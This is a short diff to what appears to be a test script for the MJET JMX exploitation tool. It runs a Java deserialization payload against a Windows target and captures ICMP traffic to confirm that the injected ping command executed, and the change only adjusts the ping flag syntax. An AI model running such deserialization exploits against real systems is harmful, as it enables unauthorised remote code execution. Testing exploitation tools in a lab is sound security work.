@@ -81,8 +81,8 @@ print_info "Restart tcpdump"
 sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &"
 
 print_info "Running jexboss command for target Windows:"
-print_info "jython mjet.py ${IP} ${PORT} deserialize ${PAYLOAD} \"ping -n 4 ${LOCALIP}\""
-jython mjet.py ${IP} ${PORT} deserialize ${PAYLOAD} "ping -n 4 ${LOCALIP}"
+print_info "jython mjet.py ${IP} ${PORT} deserialize ${PAYLOAD} \"ping /n 4 ${LOCALIP}\""
+jython mjet.py ${IP} ${PORT} deserialize ${PAYLOAD} "ping /n 4 ${LOCALIP}"
 
 print_info "Wait a little bit..."
 sleep 3
